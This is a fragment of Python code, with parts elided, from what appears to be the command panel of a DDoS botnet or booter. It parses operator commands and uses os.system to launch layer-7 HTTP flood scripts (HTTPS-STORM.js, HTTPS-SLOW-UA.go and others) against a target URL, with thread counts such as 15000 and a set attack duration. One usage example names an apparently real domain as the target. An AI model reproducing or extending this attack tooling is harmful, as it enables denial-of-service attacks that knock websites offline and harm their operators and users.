...
# LAYER 7 METHODS
            ...
            try:
                ...
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-CRAWLV2.go {url} {thread} {method} {time} ')
            except IndexError:
                print('Usage: HTTPSC <url> <threads> METHODS<GET/POST> <time>')
                print('Example: HTTPSC http://example.com 15000 get 60')
            ...
            try:
                ...
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-SLOW-UA.go {url} {thread} {method} {time}')
            except IndexError:
            ...
            try:
                ...
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-HIGH.go {url} {thread} {method} {time} ')
            except IndexError:
            ...
            try:
                ...
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-ENGINE.go  {url} {thread} {method} {time} ')
            except IndexError:
            ...
            try:
                ...
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-NULLV2.go {url} {thread} {method} {time} ')
            except IndexError:
                print('Usage: HTTPS-NULLV2 <url> <threads> METHODS<GET/POST> <time>')
                print('Example: HTTPS-NULLV2 http://example.com 15000 get 60')
            ...
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTPS-STORM.js {url} {time}')
            except IndexError:
                print('Usage: TLS  <url> <time>')
                print('Example: TLS http://vailon.com 60')
